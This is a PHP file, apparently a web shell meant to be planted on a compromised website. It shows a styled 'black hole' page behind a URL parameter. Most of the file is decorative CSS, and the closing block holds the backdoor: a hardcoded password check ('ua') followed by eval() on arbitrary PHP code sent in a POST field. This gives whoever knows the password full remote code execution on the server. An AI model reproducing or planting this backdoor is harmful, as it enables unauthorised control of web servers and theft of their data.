﻿<?php
if ($_GET['my'] == "s") {
echo '<style type="text/css">
body {

background-size: cover;
background-position: center;

 radial-gradient(
 rgba(0,255,0,.8),
 black
 );
background-blend-mode: overlay;
background:url(https://i.imgur.com/WLJYY3C.jpg),
 radial-gradient(
 rgba(0,255,0,.8),
 black
 ),
 repeating-linear-gradient(
 transparent 0,
 rgba(0,0,0,.2) 3px,
 transparent 6px
 );
 .night-vision-effect {
 
 radial-gradient(
 rgba(0,255,0,.8),
 black
 ),
 repeating-linear-gradient(
 transparent 0,
 rgba(0,0,0,.2) 3px,
 transparent 6px
 );
 background-blend-mode: overlay;
 background-size: cover;
 }
}
h1,h2{

color: #ffffff;
text-align: center;
}
h3,h4,h5{
color: black;
text-align: center;
}

form {
    margin: 0 auto;
    max-width: 95%;
    padding: 30px 30px 6px 30px;
    border: 1px solid rgba(0,0,0,.2);
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    -moz-background-clip: padding;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    background: rgba(0, 0, 0, 0.5); 
    -moz-box-shadow: 0 0 13px 3px rgba(0,0,0,.5);
    -webkit-box-shadow: 0 0 13px 3px rgba(0,0,0,.5);
    box-shadow: 0 0 13px 3px rgba(0,0,0,.5);
    overflow: hidden; 
}
/* Поле сообщения */
textarea{
    background: rgba(255, 255, 255, 0.4); 
    width: 33%;
    height: 110px;
    border: 1px solid rgba(255,255,255,.6);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
    -moz-background-clip: padding;
    -webkit-background-clip: padding-box;
    background-clip: padding-box; 
    display:block;
    
    font-size:18px;
    font-weight: 300;
    color:#fff;
    padding-left:25px;
    padding-right:20px;
    padding-top:12px;
    margin-bottom:20px;
    overflow:hidden;
}
/* Поля ввода */
input {
    width: 33%;
    height: 48px;
    border: 1px solid rgba(255,255,255,.4);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
    -moz-background-clip: padding;
    -webkit-background-clip: padding-box;
    background-clip: padding-box; 
    display:block;
    
    font-size:18px;
    font-weight: 300;    
    color:#fff;
    padding-left:20px;
    padding-right:20px;
    margin-bottom:20px;
}
input[type=submit] {
    cursor:pointer;
}
input.name {
    background: rgba(255, 255, 255, 0.4); 
    padding-left:25px;
}
input.email {
    background: rgba(255, 255, 255, 0.4);
    padding-left:25px;
}
input.message {
    background: rgba(255, 255, 255, 0.4);
    padding-left:25px;
}
::-webkit-input-placeholder {
    color: #fff;
}
:-moz-placeholder{ 
    color: #fff; 
}
::-moz-placeholder {
    color: #fff;
}
:-ms-input-placeholder {  
    color: #fff; 
}
input:focus, textarea:focus { 
    background-color: rgba(0, 0, 0, 0.2);
    -moz-box-shadow: 0 0 5px 1px rgba(255,255,255,.5);
    -webkit-box-shadow: 0 0 5px 1px rgba(255,255,255,.5);
    box-shadow: 0 0 5px 1px rgba(255,255,255,.5);
    overflow: hidden; 
}
/* Стили для кнопки отправить */
.btn {
    width: 138px;
    height: 44px;
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
    
    border: 1px solid #253737;
    background: #416b68;
    background: -webkit-gradient(linear, left top, left bottom, from(#6da5a3), to(#416b68));
    background: -webkit-linear-gradient(top, #6da5a3, #416b68);
    background: -moz-linear-gradient(top, #6da5a3, #416b68);
    background: -ms-linear-gradient(top, #6da5a3, #416b68);
    background: -o-linear-gradient(top, #6da5a3, #416b68);
    background-image: -ms-linear-gradient(top, #6da5a3 0%, #416b68 100%);
    padding: 10.5px 21px;
    -webkit-border-radius: 6px;
    -moz-border-radius: 6px;
    border-radius: 6px;
    -webkit-box-shadow: rgba(255,255,255,0.1) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    -moz-box-shadow: rgba(255,255,255,0.1) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    box-shadow: rgba(255,255,255,0.1) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    text-shadow: #333333 0 1px 0;
    color: #e1e1e1;
}
.btn:hover {
    border: 1px solid #253737;
    text-shadow: #333333 0 1px 0;
    background: #416b68;
    background: -webkit-gradient(linear, left top, left bottom, from(#77b2b0), to(#416b68));
    background: -webkit-linear-gradient(top, #77b2b0, #416b68);
    background: -moz-linear-gradient(top, #77b2b0, #416b68);
    background: -ms-linear-gradient(top, #77b2b0, #416b68);
    background: -o-linear-gradient(top, #77b2b0, #416b68);
    background-image: -ms-linear-gradient(top, #77b2b0 0%, #416b68 100%);
    color: #fff;
 }
.btn:active {
    margin-top:1px;
    text-shadow: #333333 0 -1px 0;
    border: 1px solid #333333;
    background: #ffCC00;
    background: -webkit-gradient(linear, left top, left bottom, from(#ffCC00), to(#ff6600));
    background: -webkit-linear-gradient(top, #ffcc00, #ff6600);
    background: -moz-linear-gradient(top, #ffcc00, #ff6600);
    background: -ms-linear-gradient(top, #ffcc00, #ff6600);
    background: -o-linear-gradient(top, #ffcc00, #ff6600);
    background-image: -ms-linear-gradient(top, #ffcc00 0%, #ff6600 100%);
    color: #fff;
    -webkit-box-shadow: rgba(255,255,255,0) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    -moz-box-shadow: rgba(255,255,255,0) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    box-shadow: rgba(255,255,255,0) 0 1px 0, inset rgba(255,255,255,0.7) 0 1px 0;
    outline: none;
}

</style><b><br>
<h1>&#9773; ~ black hole ~ &#9773;</h1>
<br><br>
<center>
<font color="#FF0000">
<span style="font-family: monospace;">
<span style="color: rgb(255, 255, 255);">
<br><br>
<font color="#FF0000"></font>
<br></b>';
$p = "ua";
if($p == $_POST['p']){
echo 'result<hr>';
eval($_POST['es']);
}
else
{
echo'<meta charset="utf 8">
<form method="POST">
<input type="text" name="p" class="name" placeholder="cipher"><br>
<textarea name="es" rows="10" cols="50" class="email" placeholder="~php~"></textarea><br>
<input type="submit" class="btn" value="break">';
}
}
?>  